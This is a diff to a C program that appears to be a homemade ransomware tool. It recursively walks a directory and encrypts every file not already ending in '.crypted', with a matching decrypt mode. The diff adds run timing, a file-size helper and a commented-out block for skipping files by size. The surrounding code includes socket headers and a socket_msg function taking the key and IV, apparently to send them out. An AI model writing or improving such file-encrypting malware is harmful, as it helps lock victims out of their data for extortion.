@@ -9,6 +9,9 @@
 #include <unistd.h>
 #include <sys/socket.h>
 #include <arpa/inet.h>
+#include <time.h> //to calculate elapsed time
+#include <sys/types.h>
+#include <sys/stat.h>
 
 void handleErrors(void) {
     ERR_print_errors_fp(stderr);
@@ -161,6 +164,24 @@ void socket_msg(unsigned char key[32], unsigned char iv[16]) {
 #define KEY_SIZE 32
 #define IV_SIZE 16
 
+long int findSize(char file_name[]){
+
+    FILE* fp = fopen(file_name, "r");
+
+    if (fp == NULL) {
+        printf("File not found !\n");
+        return -1;
+    }
+
+    fseek(fp, 0L, SEEK_END);
+
+    long int res = ftell(fp);
+
+    fclose(fp);
+
+    return res;
+}
+
 void crypted_list_dir(const char *path, unsigned char *key, unsigned char *iv) {
     DIR *directory;
     struct dirent *entry;
@@ -186,7 +207,7 @@ void crypted_list_dir(const char *path, unsigned char *key, unsigned char *iv) {
                 free(buffer_directory);
             }
         } else if ((strcmp(file, ".")) != 0 && (strcmp(file, "..") != 0) && (strstr(file, ".crypted") == 0)) {
-            // printf("Path file : %s/%s\n", path, file); //uncomment to see the path of the file
+            //printf("Path file : %s/%s\n", path, file); //uncomment to see the path of the file
 
             unsigned short int lenght = strlen(path) + 1 + strlen(file) + 1;
 
@@ -204,6 +225,21 @@ void crypted_list_dir(const char *path, unsigned char *key, unsigned char *iv) {
                 }
 
                 //printf("Opening : %s\n", buffer_start); //print to see if the file is going to be open
+
+                /*
+                long int res = findSize(buffer_start);
+
+                if (res != -1){
+                    printf("File : %s -   size : %ld bytes\n",file, res);
+                    if (res < 10000000){
+                        printf("----- skipping file -----\n");
+                        crypted_list_dir(path, key, iv);
+                        printf("----- skipped -----\n");
+                        free(buffer_start);
+                        free(buffer_crypted);
+                    }
+                }
+                */
 
                 file_start = fopen(buffer_start, "r"); //open the file in reading mode only
 
@@ -291,6 +327,7 @@ void decrypted_list_dir(const char *path, unsigned char *key, unsigned char *iv)
 
                 //printf("Opening : %s\n", buffer_crypted); //uncomment to see if the file is going to open
 
+
                 file_crypted = fopen(buffer_crypted, "r"); //open the file in reading mode only
 
                 unsigned long int new_file_lenght = (lenght - 8) * (sizeof(char));
@@ -338,7 +375,10 @@ void decrypted_list_dir(const char *path, unsigned char *key, unsigned char *iv)
 }
 
 int main(int argc, char *argv[]) {
-    // printf("%d arguments \n", argc - 1); //uncomment to see number of arguments
+    clock_t t;
+    t = clock();
+
+    //printf("%d arguments \n", argc - 1); //uncomment to see number of arguments
 
     if (argc == 1) {
         printf("---------------------- Manuel d'utilisation ------------------------\n"
@@ -348,7 +388,6 @@ int main(int argc, char *argv[]) {
     }
 
     if (strcmp(argv[1], "-decrypt") == 0) {
-        printf("------- Decrypting -------\n");
 
         if (strlen(argv[2]) <= PATH_MAX != 0) {
             unsigned char *key_bytes, *iv_bytes;
@@ -361,6 +400,8 @@ int main(int argc, char *argv[]) {
             iv_hex = byteTOhex(iv_bytes, IV_SIZE);
 
             printf("Key : %s\nIV : %s\n", key_hex, iv_hex);
+
+            printf("------- Decrypting -------\n");
 
             decrypted_list_dir(argv[2], key_bytes, iv_bytes);
 
@@ -390,6 +431,10 @@ int main(int argc, char *argv[]) {
 
         printf("------- Crypting done ! -------\n");
     }
+
+    t = clock() - t;
+    double time_taken = ((double)t)/CLOCKS_PER_SEC;
+    printf("Time taken : %f seconds", time_taken);
 
     return (0);
 }
